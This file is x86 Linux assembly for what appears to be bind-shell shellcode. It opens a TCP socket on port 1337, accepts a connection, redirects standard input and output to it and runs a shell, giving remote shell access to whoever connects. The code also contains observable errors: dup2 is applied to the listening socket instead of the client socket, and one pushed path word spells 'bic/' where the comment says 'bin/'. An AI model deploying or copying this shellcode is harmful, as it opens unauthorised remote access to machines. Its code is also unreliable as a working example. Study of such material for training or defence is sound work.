section .data

global main

section .text

main:

;/usr/include/linux/net.h
; socketcall syscall number is 102 , 0x66

    ; int socketcall(int call, unsigned long *args);
    ; sockfd = socket(int socket_family, int socket_type, int protocol);
    xor esi,esi
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx
    xor eax,eax
    xor edi,edi
    mov al,102     ; socketcall syscall number
    mov bl,1       ; socket function in net.h

    push esi
    push 1         ; socket_type is 1 for SOCK_STREAM in socket_type.h
    push 2          ; 2 is for AF_INET in socket.h
    mov ecx,esp

    int 0x80        ; socket function
    mov edx,eax     ; return from socket function

;struct sockaddr_in {
	;  __kernel_sa_family_t  sin_family;     /* Address family               */
	 ; __be16                sin_port;       /* Port number                  */
	 ; struct in_addr        sin_addr;       /* Internet address             */
	;};

    ; int socketcall(int call, unsigned long *args);
    ;bind(sockfd,(struct sockaddr*)&server,sizeof(server));
    push esi
    push word 0x3905;1337 port in hex and reverse
    push word 2
    mov ecx,esp
    ;now our sockaddr_in is ready

    push 16
    push ecx
    push edx
    mov  ecx,esp

    int 0x80    ; bind()


    ;listen(sockfd,1)
    mov al,102
    mov bl,4   ; net.h , listen 4
    push esi
    push edx
    mov ecx,esp
    int 0x80

    ;clientfd = accept(sockfd,(struct sockaddr*)&client,sizeof(client));
    mov al,102
    mov bl,5   ; accept number is 5 in net.h
    ; we can null last two arguments of accept 
    ; since we no need to know about client 

    push esi
    push esi 
    push edx
    mov ecx,esp 
    int 0x80

    mov edi,eax

    ;for(i=0;i<=2:i++){
    ;    dup2(newfd,i)
    ;}
    
    xor ecx,ecx
    xor eax,eax

	mov al, 63		; syscall 63 - dup2
	mov ebx, edx		; oldfd (client socket fd)
;	mov ecx, 0		; stdin file descriptor

	int 0x80		; kernel interruption

    mov al, 63
    mov cl, 1		; stdout file descriptor

    int 0x80

    mov al, 63
    mov cl, 2		; stderr file descriptor

    int 0x80

    ; now execve("////bin/bash",NULL,NULL)
    xor eax,eax
    mov al,0xb
 
    ;2f 2f 2f 2f 62 69 6e 2f 62 61 73 68 
    push 0x68736162
    push 0x2f636962
    push 0x2f2f2f2f
    mov ebx,esp 
    mov ecx,esi
    mov edx,esi 
    int 0x80

    







